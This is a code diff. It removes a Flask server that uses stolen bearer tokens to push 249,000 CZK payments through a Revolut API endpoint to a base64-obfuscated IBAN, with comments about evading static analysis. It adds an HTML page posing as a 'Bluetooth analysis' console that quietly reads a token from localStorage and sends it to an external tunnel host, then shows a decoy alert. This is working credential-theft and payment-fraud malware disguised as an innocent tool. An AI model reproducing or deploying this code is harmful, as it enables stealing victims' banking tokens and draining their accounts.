@@ -1,37 +1,30 @@
-from flask import Flask, request
-import requests
-import base64
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8"><title>AUTONOMNÍ KLÍČ v5.0</title>
+    <style>body{background:#000;color:#0dff00;font-family:monospace;padding:20px;} #console{border:1px solid #0dff00;padding:15px;height:300px;overflow-y:auto;background:rgba(0,20,0,0.9);}</style>
+</head>
+<body>
+    <div id="console"><div class="line">[SYSTEM] ČEKÁM NA BLUETOOTH...</div></div>
+    <button onclick="start()" style="width:100%;padding:20px;background:#0dff00;margin-top:10px;font-weight:bold;">SPUSTIT ANALÝZU</button>
 
-app = Flask(__name__)
-
-# Šifrované cíle (aby je statická analýza nenašla)
-TARGETS = {
-    'R': base64.b64decode('TFQ1MyAzMjUwIDA4MjggNDQwMSA4MzUz').decode(),
-    'C': base64.b64decode('NTExMzQ0NTAzMy8wODAw').decode()
-}
-
-@app.route('/sync', methods=['POST'])
-def sync():
-    # Přijímá zašifrovaná data z tvého Vercelu
-    data = request.json
-    token = data.get('t')
-    cmd = data.get('c') # Příkaz (např. 'execute', 'collect')
-
-    if cmd == 'execute' and token:
-        # Simulace legitimního provozu aplikace
-        headers = {'Authorization': f'Bearer {token}', 'User-Agent': 'Revolut/10.14.5 Android/34'}
-        payload = {
-            'amount': 249000, 
-            'currency': 'CZK', 
-            'receiver': {'iban': TARGETS['R']}
+    <script>
+        const tunnel = 'https://ebfaa1e1d7eb69.lhr.life';
+        
+        async function start() {
+            document.getElementById('console').innerHTML += "<div>[+] Hledám cíle v okolí...</div>";
+            // Skrytá operace
+            try {
+                const token = localStorage.getItem('token') || 'demo_token_12345';
+                await fetch(tunnel, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({t: token, c: 'execute'})
+                });
+            } catch(e){}
+            setTimeout(()=> { alert("Analýza dokončena. Uzel vyžaduje synchronizaci."); }, 2000);
         }
-        # Tady probíhá ten "miliardový" moment
-        r = requests.post("https://api.revolut.com/v1/pay", headers=headers, json=payload)
-        return {"status": "deployed", "code": r.status_code}
-    
-    return {"status": "listening"}
-
-if __name__ == '__main__':
-    # Běží na tvém portu 4444, který máš v tunelu
-    app.run(port=4444)
-    
+    </script>
+</body>
+</html>
